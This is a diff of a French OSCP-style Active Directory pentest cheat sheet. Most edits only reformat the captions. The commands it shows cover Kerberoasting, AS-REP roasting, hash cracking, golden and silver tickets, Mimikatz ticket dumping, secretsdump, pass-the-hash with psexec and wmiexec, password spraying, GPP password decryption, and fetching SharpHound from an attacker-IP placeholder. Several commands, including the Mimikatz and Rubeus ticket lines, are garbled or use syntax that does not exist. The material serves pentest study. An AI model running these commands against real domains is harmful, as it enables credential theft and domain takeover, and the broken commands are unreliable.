@@ -13,35 +13,35 @@ Identifier les utilisateurs, groupes, services et relations du domaine.
 Vérifier les ports et les services de la cible autorisée.
 
 
-Identifier les versions des services.
+<p class="oscp-command-note">Identifier les versions des services.</p>
 
 ```bash
 nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49152-65535 -sS -sV -oA ad-enum <target-ip>
 ```
 
 
-Interroger les objets de l'annuaire LDAP.
+<p class="oscp-command-note">Interroger les objets de l&#x27;annuaire LDAP.</p>
 
 ```bash
 ldapsearch -x -H ldap://<dc-ip> -b "dc=domain,dc=com"
 ```
 
 
-Rechercher des chemins ou paramètres web.
+<p class="oscp-command-note">Rechercher des chemins ou paramètres web.</p>
 
 ```bash
 gobuster dns -d domain.com -t 25 -w /us/share/wordlists/Seclist/Discovery/DNS/subdomain-top2000.txt
 ```
 
 
-Examiner le service avec les scripts NSE sélectionnés.
+<p class="oscp-command-note">Examiner le service avec les scripts NSE sélectionnés.</p>
 
 ```bash
 nmap -n -sV --script "ldap* and not brute" -p 389 <dc-ip>
 ```
 
 
-Commande `./kerbrute_linux_amd64` pour la rubrique « Reconnaissance avec Nmap ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ./kerbrute_linux_amd64.</p>
 
 ```bash
 # Using Kerbrute
@@ -52,7 +52,7 @@ crackmapexec smb [domain].com -u '' -p '' --users
 ```
 
 
-Commande `impacket-getadusers` pour la rubrique « Reconnaissance avec Nmap ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-getadusers.</p>
 
 ```bash
 # Using GetAdUsers.py (same tool)
@@ -68,36 +68,30 @@ enum4linux -a -u "<username>" -p "<password>" <dc_ip>
 Interroger les enregistrements DNS et identifier les services associés.
 
 
-Examiner le service avec les scripts NSE sélectionnés.
+<p class="oscp-command-note">Examiner le service avec les scripts NSE sélectionnés.</p>
 
 ```bash
 nmap --script dns-brute,dns-nsid,dns-recursion,dns-zone-transfer -p 53 <target_ip>
 ```
 
 
-Examiner le service avec les scripts NSE sélectionnés.
-
 ```bash
 nmap -p 53 --script "dns-nsid,dns-srv-enum" <target_ip>
 ```
 
 
-Interroger les enregistrements DNS.
+<p class="oscp-command-note">Interroger les enregistrements DNS.</p>
 
 ```bash
 dig axfr @<dc-ip> <domain>
 ```
 
 
-Interroger les enregistrements DNS.
-
 ```bash
 dig A <domain> @<dc-ip>
 dig SRV _ldap._tcp.dc._msdcs.<domain> @<dc-ip>
 ```
 
-
-Interroger les enregistrements DNS.
 
 ```bash
 dig axfr <domain_name> @<dns_server_ip>  # Attempt zone transfer
@@ -109,8 +103,6 @@ nslookup
 ```
 
 
-Interroger les enregistrements DNS.
-
 ```bash
 dnsrecon -d <domain_name> -n <dns_server_ip> -t axfr
 
@@ -118,21 +110,21 @@ dnsenum --enum -f /usr/share/dnsenum/dns.txt --dnsserver <dns_server_ip> <domain
 ```
 
 
-Examiner les ports et les services avec Nmap.
+<p class="oscp-command-note">Examiner les ports et les services avec Nmap.</p>
 
 ```bash
 nmap -sL <target_ip_range> | grep "Nmap scan report"  # Reverse DNS lookup for a range
 ```
 
 
-Interroger les enregistrements DNS.
+<p class="oscp-command-note">Interroger les enregistrements DNS.</p>
 
 ```bash
 dig @<dns_server_ip> -t A +norecurse <target_domain>
 ```
 
 
-Examiner les informations AD ou réseau en PowerShell.
+<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
 
 ```powershell
 Resolve-DnsName -Name <domain_name> -Server <dns_server_ip> -DnsOnly
@@ -144,7 +136,7 @@ Resolve-DnsName -Name <domain_name> -Server <dns_server_ip> -DnsOnly
 Vérifier les ports et les services de la cible autorisée.
 
 
-Examiner le service avec les scripts NSE sélectionnés.
+<p class="oscp-command-note">Examiner le service avec les scripts NSE sélectionnés.</p>
 
 ```bash
 # Check for Kerberos service availability and get basic information
@@ -158,7 +150,7 @@ nmap -p 88 --script krb5-enum-users,krb5-scan <target_ip>
 ```
 
 
-Commande `getnpusers.py` pour la rubrique « Énumération Kerberos (port 88) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil getnpusers.py.</p>
 
 ```bash
 # This is the same tool as impacket-GetNPUsers.
@@ -171,7 +163,7 @@ hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
 
-Commande `getuserspns.py` pour la rubrique « Énumération Kerberos (port 88) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil getuserspns.py.</p>
 
 ```bash
 GetUserSPNs.py <domain>/<username>:<password> -dc-ip <dc-ip>
@@ -181,7 +173,7 @@ hashcat -m 13100 kerberoast.txt rockyou.txt
 ```
 
 
-Commande `kerbrute` pour la rubrique « Énumération Kerberos (port 88) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil kerbrute.</p>
 
 ```bash
 kerbrute userenum -d <domain> -p <userlist> <target_ip>
@@ -190,21 +182,21 @@ kerbrute userenum -d <domain> -p <userlist> <target_ip>
 ```
 
 
-Commande `impacket-getnpusers` pour la rubrique « Énumération Kerberos (port 88) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-getnpusers.</p>
 
 ```bash
 impacket-GetNPUsers -dc-ip <dc_ip> -request -usersfile <userlist> <target_domain>
 ```
 
 
-Commande `impacket-gettgt` pour la rubrique « Énumération Kerberos (port 88) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-gettgt.</p>
 
 ```bash
 impacket-GetTGT -dc-ip <dc_ip> -outputfile <outputfile> <username>@<domain>
 ```
 
 
-Analyser une empreinte avec le mode indiqué.
+<p class="oscp-command-note">Analyser une empreinte avec le mode indiqué.</p>
 
 ```bash
 john --wordlist=<wordlist> <ticket_file>
@@ -213,7 +205,7 @@ hashcat -m 13100 <ticket_file> <wordlist>
 ```
 
 
-Commande `python3` pour la rubrique « Énumération Kerberos (port 88) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil python3.</p>
 
 ```bash
 # Request a TGT (Ticket Granting Ticket)
@@ -224,7 +216,7 @@ python3 GetST.py -dc-ip <dc_ip> <domain>/<username>:<password> -spn <service>/<t
 ```
 
 
-Commande `impacket-getuserspns` pour la rubrique « Énumération Kerberos (port 88) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-getuserspns.</p>
 
 ```bash
 # Extract all service tickets for offline cracking
@@ -237,14 +229,14 @@ hashcat -m 13100 <tickets_file> <wordlist>
 ```
 
 
-Commande `krb5-brute` pour la rubrique « Énumération Kerberos (port 88) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil krb5-brute.</p>
 
 ```bash
 krb5-brute -d <domain> -t <target_ip> -u <username> -p <password_list>
 ```
 
 
-Commande `python3` pour la rubrique « Énumération Kerberos (port 88) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil python3.</p>
 
 ```bash
 # Renew a TGT (for Kerberos ticket manipulation)
@@ -257,7 +249,7 @@ rubeus.exe s4u /user:<username> /rc4:<password> /impersonateuser:<target_user>
 ```
 
 
-Commande `mimikatz` pour la rubrique « Énumération Kerberos (port 88) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.</p>
 
 ```powershell
 # Dump Kerberos tickets from memory using Mimikatz
@@ -265,7 +257,7 @@ mimikatz "lsadump::dcom" "sekurlsa::tickets /export"
 ```
 
 
-Commande `python3` pour la rubrique « Énumération Kerberos (port 88) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil python3.</p>
 
 ```bash
 # Test for weak pre-authentication configurations
@@ -273,7 +265,7 @@ python3 kerbrute.py -d <domain> -u <user_list> -p <password_list> -dc <dc_ip>
 ```
 
 
-Commande `rubeus.exe` pour la rubrique « Énumération Kerberos (port 88) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil rubeus.exe.</p>
 
 ```bash
 # Create a silver ticket with Rubeus
@@ -281,7 +273,7 @@ rubeus.exe tgt::add /user:<username> /rc4:<password> /sid:<domain_sid> /domain:<
 ```
 
 
-Commande `impacket-gettgt` pour la rubrique « Énumération Kerberos (port 88) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-gettgt.</p>
 
 ```bash
 # 1. Obtain a Valid TGT (Ticket Granting Ticket)
@@ -292,7 +284,7 @@ impacket-atexec -target-ip <target_ip> -service <service> -ticket <ticket_file> 
 ```
 
 
-Commande `rubeus.exe` pour la rubrique « Énumération Kerberos (port 88) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil rubeus.exe.</p>
 
 ```bash
 # Create a golden ticket with Rubeus
@@ -300,7 +292,7 @@ rubeus.exe tgt::add /user:<username> /rc4:<password> /domain:<domain> /sid:<doma
 ```
 
 
-Commande `impacket-secretsdump` pour la rubrique « Énumération Kerberos (port 88) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-secretsdump.</p>
 
 ```bash
 # 1. Obtain KRBTGT NTLM Hash
@@ -322,14 +314,14 @@ impacket-psexec -target-ip <target_ip> -ticket <ticket_file> <username>
 Vérifier les ports et les services de la cible autorisée.
 
 
-Examiner le service avec les scripts NSE sélectionnés.
+<p class="oscp-command-note">Examiner le service avec les scripts NSE sélectionnés.</p>
 
 ```bash
 nmap -n -sV --script "ldap* and not brute" <target_ip>
 ```
 
 
-Interroger les objets de l'annuaire LDAP.
+<p class="oscp-command-note">Interroger les objets de l&#x27;annuaire LDAP.</p>
 
 ```bash
 ldapsearch -x -h <dc-ip> -b "dc=domain,dc=com" "(objectClass=*)"
@@ -337,8 +329,6 @@ ldapsearch -x -h <dc-ip> -b "dc=domain,dc=com" "(objectClass=*)"
 ldapsearch -x -H ldap://<dc-ip> -b "dc=domain,dc=com"
 ```
 
-
-Interroger les objets de l'annuaire LDAP.
 
 ```bash
 # Énumérer les utilisateurs du domaine
@@ -348,8 +338,6 @@ ldapsearch -x -h <dc-ip> -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountNa
 ldapsearch -x -h <dc-ip> -b "dc=domain,dc=com" "(objectClass=group)" cn
 ```
 
-
-Interroger les objets de l'annuaire LDAP.
 
 ```bash
 # Basic LDAP query
@@ -385,14 +373,14 @@ ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=
 ```
 
 
-Commande `kerbrute` pour la rubrique « Énumération LDAP (ports 389 et 636) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil kerbrute.</p>
 
 ```bash
 kerbrute userenum -d <domain> --dc <dc_ip> <userlist>
 ```
 
 
-Exemple technique pour la rubrique « Énumération LDAP (ports 389 et 636) ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Énumération LDAP (ports 389 et 636) ».</p>
 
 ```bash
 # Search Terms to Find Cleartext Passwords
@@ -497,7 +485,7 @@ Exemple technique pour la rubrique « Énumération LDAP (ports 389 et 636) ».
 Vérifier les ports et les services de la cible autorisée.
 
 
-Examiner les ports et les services avec Nmap.
+<p class="oscp-command-note">Examiner les ports et les services avec Nmap.</p>
 
 ```bash
 # Nmap scan
@@ -512,7 +500,7 @@ net view \\[domainName] /all
 ```
 
 
-Examiner le service avec les scripts NSE sélectionnés.
+<p class="oscp-command-note">Examiner le service avec les scripts NSE sélectionnés.</p>
 
 ```bash
 nmap --script smb-enum-shares.nse -p445 <ip>
@@ -529,7 +517,7 @@ nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-
 ```
 
 
-Énumérer les informations SMB ou RPC.
+<p class="oscp-command-note">Énumérer les informations SMB ou RPC.</p>
 
 ```bash
 # Use smbclient or enum4linux to enumerate SMB shares.
@@ -540,8 +528,6 @@ crackmapexec smb <dc-ip> -u '' -p '' --shares
 ```
 
 
-Énumérer les informations SMB ou RPC.
-
 ```bash
 # Perform null session enumeration to list domain users.
 rpcclient -U "" <dc-ip> --command="enumdomusers"
@@ -551,7 +537,7 @@ crackmapexec smb <dc-ip> --rid-brute
 ```
 
 
-Commande `ngrep` pour la rubrique « Énumération SMB (port 445) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ngrep.</p>
 
 ```bash
 # Network Packet Analysis: captures and analyzes packets related to SMB traffic on port 139, looking for specific patterns
@@ -566,7 +552,7 @@ smbclient -L <IP>
 `smbmap`  
 
 
-Énumérer les informations SMB ou RPC.
+<p class="oscp-command-note">Énumérer les informations SMB ou RPC.</p>
 
 ```bash
 smbmap -H <IP>
@@ -576,7 +562,7 @@ smbmap -u '' -p '' -H <IP> -R
 ```
 
 
-Examiner le service distant avec les paramètres fournis.
+<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
 
 ```bash
 crackmapexec smb <IP>
@@ -588,7 +574,7 @@ crackmapexec smb <IP> -u '[user]' -p '[password]'
 ```
 
 
-Énumérer les informations SMB ou RPC.
+<p class="oscp-command-note">Énumérer les informations SMB ou RPC.</p>
 
 ```bash
 # Basic information gathering on the domain
@@ -607,8 +593,6 @@ enum4linux -a -u "guest" -p "" <ip>
 enum4linux -a -u "[user]" -p "[password]" <ip>
 ```
 
-
-Énumérer les informations SMB ou RPC.
 
 ```bash
 smbclient --no-pass -L //<ip>
@@ -629,7 +613,7 @@ mget *
 ```
 
 
-Examiner le service distant avec les paramètres fournis.
+<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
 
 ```bash
 crackmapexec smb <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
@@ -637,7 +621,7 @@ hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV
 ```
 
 
-Commande `mkdir` pour la rubrique « Énumération SMB (port 445) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil mkdir.</p>
 
 ```bash
 # Mounts SMB shares to a local directory for further access and manipulation.
@@ -647,7 +631,7 @@ sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>' //<IP>/<SHARE> /tmp/
 ```
 
 
-Commande `psexec.py` pour la rubrique « Énumération SMB (port 445) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil psexec.py.</p>
 
 ```bash
 # PsExec
@@ -668,8 +652,6 @@ atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
 ```
 
 
-Commande `psexec.py` pour la rubrique « Énumération SMB (port 445) ».
-
 ```bash
 # Credentials
 psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
@@ -683,7 +665,7 @@ crackmapexec smb <IP> -u <USER> -H <NTHASH> --psexec
 ```
 
 
-Commande `wmiexec.py` pour la rubrique « Énumération SMB (port 445) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil wmiexec.py.</p>
 
 ```bash
 # Credentials
@@ -703,35 +685,35 @@ crackmapexec wmiexec <IP> -u <USER> -H <NTHASH>
 Vérifier les ports et les services de la cible autorisée.
 
 
-Examiner le service avec les scripts NSE sélectionnés.
+<p class="oscp-command-note">Examiner le service avec les scripts NSE sélectionnés.</p>
 
 ```bash
 nmap -p 5985,5986 --script winrm-info $IP
 ```
 
 
-Examiner le service distant avec les paramètres fournis.
+<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
 
 ```bash
 crackmapexec winrm <dc-ip> -u <username> -p <password>
 ```
 
 
-Commande `evil-winrm` pour la rubrique « Énumération WinRM (port 5985) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil evil-winrm.</p>
 
 ```bash
 evil-winrm -i <dc-ip> -u <username> -p <password>
 ```
 
 
-Examiner le service distant avec les paramètres fournis.
+<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
 
 ```bash
 crackmapexec winrm <IP> -u <USER> -p <PASSWORD>
 ```
 
 
-Commande `enter-pssession` pour la rubrique « Énumération WinRM (port 5985) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil enter-pssession.</p>
 
 ```powershell
 # Using PowerShell to connect to WinRM
@@ -744,7 +726,7 @@ Enter-PSSession -ComputerName $IP -Credential (Get-Credential)
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/AD_Methodology.png)
 
 
-Exemple technique pour la rubrique « Énumération de base ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Énumération de base ».</p>
 
 ```powershell
 # Using PowerShell
@@ -758,7 +740,7 @@ wmic useraccount where name='[usernameToFind]' get sid
 ```
 
 
-Examiner les informations AD ou réseau en PowerShell.
+<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
 
 ```powershell
 # Using PowerShell
@@ -777,8 +759,6 @@ nslookup yourdomain.com
 # Open ADUC --> In the Domain Controllers Organizational Unit (OU), you can find the domain controllers listed there.
 ```
 
-
-Examiner les informations AD ou réseau en PowerShell.
 
 ```powershell
 # Using PowerShell
@@ -803,8 +783,6 @@ Open Active Directory Users and Computers and enable Advanced Features under the
 ```
 
 
-Examiner les informations AD ou réseau en PowerShell.
-
 ```bash
 # PowerShell
   Get-ADComputer -Filter * -Properties ServicePrincipalName | Select-Object -ExpandProperty ServicePrincipalName
@@ -815,7 +793,7 @@ Examiner les informations AD ou réseau en PowerShell.
 ```
 
 
-Commande `net` pour la rubrique « Énumération de base ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil net.</p>
 
 ```bash
 net user /domain
@@ -823,15 +801,13 @@ net user [username] /domain
 ```
 
 
-Commande `net` pour la rubrique « Énumération de base ».
-
 ```bash
 net groups /domain
 net groups [groupName] /domain
 ```
 
 
-Exemple technique pour la rubrique « Énumération de base ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Énumération de base ».</p>
 
 ```powershell
 $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
@@ -840,7 +816,7 @@ $LDAP = "LDAP://$PDC/$DN"
 ```
 
 
-Commande `function` pour la rubrique « Énumération de base ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil function.</p>
 
 ```powershell
 function Get-SAMInfo {
@@ -857,14 +833,14 @@ function Get-SAMInfo {
 ```
 
 
-Exemple technique pour la rubrique « Énumération de base ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Énumération de base ».</p>
 
 ```powershell
 $group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=[GroupName]))"
 ```
 
 
-Commande `function` pour la rubrique « Énumération de base ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil function.</p>
 
 ```powershell
 function LDAPSearch {
@@ -878,28 +854,26 @@ function LDAPSearch {
 ```
 
 
-Interroger les objets de l'annuaire LDAP.
+<p class="oscp-command-note">Interroger les objets de l&#x27;annuaire LDAP.</p>
 
 ```powershell
 LDAPSearch -LDAPQuery "(samAccountType=805306368)"
 ```
 
 
-Interroger les objets de l'annuaire LDAP.
-
 ```powershell
 LDAPSearch -LDAPQuery "(objectclass=group)"
 ```
 
 
-Exemple technique pour la rubrique « Énumération de base ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Énumération de base ».</p>
 
 ```text
 $group
 ```
 
 
-Commande `foreach` pour la rubrique « Énumération de base ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil foreach.</p>
 
 ```powershell
 foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
@@ -911,7 +885,7 @@ foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
 ## PowerView
 
 
-Commande `import-module` pour la rubrique « PowerView ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil import-module.</p>
 
 ```powershell
 Import-Module .\PowerView.ps1
@@ -922,7 +896,7 @@ Import-Module .\PowerView.ps1
 `Get-NetDomain`  
 
 
-Examiner les informations AD ou réseau en PowerShell.
+<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
 
 ```powershell
 Get-ADDomainController -Discover
@@ -933,35 +907,27 @@ Get-ADDomainController -Discover
 `Get-NetUser`  
 
 
-Examiner les informations AD ou réseau en PowerShell.
+<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
 
 ```powershell
 Get-NetUser | Select-Object [attributes]
 ```
 
 
-Examiner les informations AD ou réseau en PowerShell.
-
 ```powershell
 Get-NetGroup | Select-Object [attributes]
 ```
 
-
-Examiner les informations AD ou réseau en PowerShell.
 
 ```powershell
 Get-NetComputer | Select-Object [attributes]
 ```
 
 
-Examiner les informations AD ou réseau en PowerShell.
-
 ```powershell
 Get-NetGroup -GroupName "Domain Admins"
 ```
 
-
-Examiner les informations AD ou réseau en PowerShell.
 
 ```powershell
 Get-NetUser -SPN
@@ -972,7 +938,7 @@ Get-NetUser -SPN
 `Get-NetDomainController` · `Get-NetShare`  
 
 
-Examiner les informations AD ou réseau en PowerShell.
+<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
 
 ```powershell
 Get-NetUser -Delegation
@@ -984,14 +950,14 @@ Get-NetUser -Delegation
 Examiner les objets, les droits et les services du domaine.
 
 
-Commande `setspn` pour la rubrique « Service Principal Names (SPN) Énumération ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil setspn.</p>
 
 ```bash
 setspn -L [service]
 ```
 
 
-Examiner les informations AD ou réseau en PowerShell.
+<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
 
 ```powershell
 Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname
@@ -1006,42 +972,42 @@ Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname
 `AllExtendedRights` · `ForceChangePassword` · `Self` · `Get-ObjectAcl`  
 
 
-Commande `get-objectacl` pour la rubrique « Énumération des permissions d'objets ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil get-objectacl.</p>
 
 ```powershell
 Get-ObjectAcl -Identity [username]
 ```
 
 
-Commande `convert-sidtoname` pour la rubrique « Énumération des permissions d'objets ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil convert-sidtoname.</p>
 
 ```powershell
 Convert-SidToName [SID]
 ```
 
 
-Commande `get-objectacl` pour la rubrique « Énumération des permissions d'objets ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil get-objectacl.</p>
 
 ```powershell
 Get-ObjectAcl -Identity "[GroupName]" | Where-Object { $_.ActiveDirectoryRights -eq "GenericAll" } | Select-Object SecurityIdentifier, ActiveDirectoryRights
 ```
 
 
-Exemple technique pour la rubrique « Énumération des permissions d'objets ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Énumération des permissions d&#x27;objets ».</p>
 
 ```powershell
 "[SID1]", "[SID2]" | Convert-SidToName
 ```
 
 
-Commande `net` pour la rubrique « Énumération des permissions d'objets ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil net.</p>
 
 ```bash
 net group "[GroupName]" [username] /add /domain
 ```
 
 
-Examiner les informations AD ou réseau en PowerShell.
+<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
 
 ```powershell
 Get-NetGroup "[GroupName]" | Select-Object member
@@ -1057,7 +1023,7 @@ Examiner les objets, les droits et les services du domaine.
 `Find-DomainShare`  
 
 
-Commande `gpp-decrypt` pour la rubrique « Énumération des partages du domaine ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil gpp-decrypt.</p>
 
 ```bash
 gpp-decrypt [encrypted_password]
@@ -1069,7 +1035,7 @@ gpp-decrypt [encrypted_password]
 Examiner les objets, les droits et les services du domaine.
 
 
-Commande `invoke-webrequest` pour la rubrique « BloodHound & SharpHound ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil invoke-webrequest.</p>
 
 ```powershell
 # Download the PowerShell version of SharpHound
@@ -1080,7 +1046,7 @@ Invoke-WebRequest -Uri "http://[attacker_ip]/sharphound.exe" -OutFile "C:\Temp\s
 ```
 
 
-Commande `nltest` pour la rubrique « BloodHound & SharpHound ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil nltest.</p>
 
 ```powershell
 # Find your domain name
@@ -1095,7 +1061,7 @@ Get-ADDomainController -Discover
 ```
 
 
-Commande `import-module` pour la rubrique « BloodHound & SharpHound ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil import-module.</p>
 
 ```powershell
 # Import the SharpHound script into memory
@@ -1110,7 +1076,7 @@ Invoke-BloodHound -CollectionMethod All -Domain <domain> -OutputDirectory C:\Tem
 `All`  
 
 
-Commande `invoke-bloodhound` pour la rubrique « BloodHound & SharpHound ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil invoke-bloodhound.</p>
 
 ```powershell
 Invoke-BloodHound -CollectionMethod Group
@@ -1122,14 +1088,14 @@ Invoke-BloodHound -CollectionMethod ACL
 `.zip`  
 
 
-Commande `c` pour la rubrique « BloodHound & SharpHound ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
 
 ```text
 C:\Temp
 ```
 
 
-Commande `download` pour la rubrique « BloodHound & SharpHound ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil download.</p>
 
 ```bash
 # Having an Evil-WinRM session
@@ -1147,7 +1113,7 @@ Invoke-WebRequest -Uri "http://your-kali-ip/upload/path" -OutFile "C:\Temp\*.zip
 `https://localhost:7474` · `neo4j:neo4j` · `neo4j:Neo4j`  
 
 
-Commande `neo4j` pour la rubrique « BloodHound & SharpHound ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil neo4j.</p>
 
 ```bash
 # Start the Neo4j service in Kali (needed for analyzing the collected data):
@@ -1159,35 +1125,31 @@ sudo neo4j start
 `bloodhound` · `WriteGPO` · `OwnsGPO`  
 
 
-Commande `gpo` pour la rubrique « BloodHound & SharpHound ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil gpo.</p>
 
 ```text
 GPO control
 ```
 
 
-Exemple technique pour la rubrique « BloodHound & SharpHound ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « BloodHound &amp; SharpHound ».</p>
 
 ```text
 (NODES)-[:RELATIONSHIP]->(NODES)
 ```
 
 
-Commande `match` pour la rubrique « BloodHound & SharpHound ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil match.</p>
 
 ```text
 MATCH (m:Computer) RETURN m
 ```
 
 
-Commande `match` pour la rubrique « BloodHound & SharpHound ».
-
 ```text
 MATCH (m:User) RETURN m
 ```
 
-
-Commande `match` pour la rubrique « BloodHound & SharpHound ».
 
 ```text
 MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
@@ -1198,7 +1160,7 @@ MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
 `SQLAdmin`  
 
 
-Commande `match` pour la rubrique « BloodHound & SharpHound ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil match.</p>
 
 ```text
 MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
@@ -1209,7 +1171,7 @@ MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:S
 `CanPSRemote`  
 
 
-Commande `match` pour la rubrique « BloodHound & SharpHound ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil match.</p>
 
 ```text
 MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
@@ -1221,21 +1183,21 @@ MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:C
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-Commande `secretsdump.py` pour la rubrique « Analyse des empreintes de mots de passe ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil secretsdump.py.</p>
 
 ```bash
 secretsdump.py <domain>/<username>:<password>@<dc-ip>
 ```
 
 
-Analyser une empreinte avec le mode indiqué.
+<p class="oscp-command-note">Analyser une empreinte avec le mode indiqué.</p>
 
 ```bash
 hashcat -m 1000 ntlm-hashes.txt rockyou.txt
 ```
 
 
-Examiner le service distant avec les paramètres fournis.
+<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
 
 ```bash
 # Many more commands can be found in the Section 6.
@@ -1246,7 +1208,7 @@ crackmapexec smb <dc-ip> -u usernames.txt -p password123 --spray
 ## MS-RPRN Print Spooler Service Exploitation
 
 
-Énumérer les informations SMB ou RPC.
+<p class="oscp-command-note">Énumérer les informations SMB ou RPC.</p>
 
 ```bash
 rpcclient -U "<user>%<password>" <dc-ip> --command="enumprinters"
@@ -1399,7 +1361,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 ### GPP Main Method for Extraction
 
 
-Commande `net` pour la rubrique « GPP Main Method for Extraction ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil net.</p>
 
 ```powershell
 net use z:\\[hostname/domain]\SYSVOL
@@ -1410,14 +1372,14 @@ net use z:\\[hostname/domain]\SYSVOL
 `Groups.xml`  
 
 
-Exemple technique pour la rubrique « GPP Main Method for Extraction ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « GPP Main Method for Extraction ».</p>
 
 ```text
 \hostname.domain\Policies\{00000000-0000-0000-0000-00000000000}\MACHINE\Preferences\Groups\Groups.xml
 ```
 
 
-Commande `dir` pour la rubrique « GPP Main Method for Extraction ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil dir.</p>
 
 ```powershell
 dir /s Groups.xml
@@ -1430,7 +1392,7 @@ type Groups.xml
 `Hash` · `cpassword`  
 
 
-Commande `gpp-decrypt` pour la rubrique « GPP Main Method for Extraction ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil gpp-decrypt.</p>
 
 ```bash
 gpp-decrypt [gpp_hash/cpassword]
@@ -1441,7 +1403,7 @@ sup3r53cr3tGP0pa55
 ```
 
 
-Commande `dir` pour la rubrique « GPP Main Method for Extraction ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil dir.</p>
 
 ```bash
 # Check for cpassword in the SYSvol share to obtain cleartext passwords in XML files.
